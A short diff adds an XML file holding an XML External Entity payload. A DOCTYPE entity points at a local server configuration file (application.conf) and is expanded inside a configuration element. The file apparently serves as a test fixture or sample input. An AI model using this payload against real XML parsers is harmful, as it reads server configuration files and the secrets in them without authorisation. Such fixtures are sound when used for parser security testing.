@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE configuration [
+<!ELEMENT configuration ANY >
+<!ENTITY file SYSTEM "file:///c:/server_files/application.conf" >
+]>
+<configuration>&file;</configuration>
